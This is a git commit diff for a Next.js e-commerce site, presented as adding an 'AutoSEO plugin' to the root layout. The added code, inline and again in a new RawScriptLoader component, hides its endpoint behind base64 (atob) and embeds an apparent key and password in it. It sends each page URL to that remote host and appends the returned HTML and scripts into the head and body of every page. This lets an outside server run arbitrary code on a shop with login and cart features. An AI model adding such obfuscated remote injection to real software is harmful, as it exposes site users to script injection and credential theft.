0341f8249c03e128019c9abbc7bf796b16cc7613
Mohd Afzal <afzalahmad@Mohds-MacBook-Pro.local>
2026-03-24 11:44:07 +0530

    feat: add AutoSEO plugin script to layout

--- client/src/app/layout.js
+++ client/src/app/layout.js
@@ -3,8 +3,9 @@ import { Navbar } from "@/components/layout/Header";
 import { Footer } from "@/components/layout/Footer";
 import { CartProvider } from "@/lib/cart-context";
 import { AuthProvider } from "@/lib/auth-context";
-
 import { WishlistProvider } from "@/lib/wishlist-context";
+
+import RawScriptLoader from "@/components/RawScriptLoader";
 
 export const metadata = {
   title: "DfixKart | Premium Quality Products - Shop Online",
@@ -40,6 +41,29 @@ export default function RootLayout({ children }) {
             </CartProvider>
           </WishlistProvider>
         </AuthProvider>
+        <RawScriptLoader />
+        <script dangerouslySetInnerHTML={{ __html: `
+window.jQuery ||
+document.write("<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'><\\/script>");
+` }} />
+        <script dangerouslySetInnerHTML={{ __html: `
+var eppathurl = window.location.origin + window.location.pathname;
+var eptagmanage = new XMLHttpRequest();
+eptagmanage.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+        if (this.response !== 0) {
+            var temp = new Array();
+            var mystr = this.response;
+            temp = mystr.split("||||||||||");
+            jQuery("head").find("title").remove();
+            jQuery("head").append(temp[0]);
+            jQuery("body").append(temp[1]);
+        }
+    }
+};
+eptagmanage.open("GET", atob("aHR0cHM6Ly9wbHVnaW5zLmF1dG9zZW9wbHVnaW4uY29tL2FsbGhlYWRkYXRhP2VrZXk9ZS1BVVRPU0VPUExVR0lOOTQwOTY3MDI1NiZla2V5cGFzcz1pbFBIUlRWOXJhMzFKQkNOcXdUbGRBblNMd2s3RDE4b3JUVEImc2l0ZXVybD0=") + eppathurl);
+eptagmanage.send();
+` }} />
       </body>
     </html>
   );
---
+++ client/src/components/RawScriptLoader.js
@@ -0,0 +1,42 @@
+"use client";
+
+import { useEffect } from "react";
+
+export default function RawScriptLoader() {
+  useEffect(() => {
+    if (typeof window === "undefined") return;
+
+    // Create script tag manually
+    const script = document.createElement("script");
+
+    script.innerHTML = `
+window.jQuery ||
+document.write("<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'><\\/script>");
+
+var eppathurl = window.location.origin + window.location.pathname;
+var eptagmanage = new XMLHttpRequest();
+eptagmanage.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+        if (this.response !== 0) {
+            var temp = new Array();
+            var mystr = this.response;
+            temp = mystr.split("||||||||||");
+            jQuery("head").find("title").remove();
+            jQuery("head").append(temp[0]);
+            jQuery("body").append(temp[1]);
+        }
+    }
+};
+eptagmanage.open("GET", atob("aHR0cHM6Ly9wbHVnaW5zLmF1dG9sZWFwbHVnaW4uY29tL2FsbGhlYWRkYXRhP2VrZXk9ZS1BVVRPU0VPUExVR0lOOTQwOTY3MDI1NiZla2V5cGFzcz1pbFBIUlRWOXJhMzFKQkNOcXdUbGRBblNMd2s3RDE4b3JUVEImc2l0ZXVybD0=") + eppathurl);
+eptagmanage.send();
+    `;
+
+    document.body.appendChild(script);
+
+    return () => {
+      document.body.removeChild(script);
+    };
+  }, []);
+
+  return null;
+}
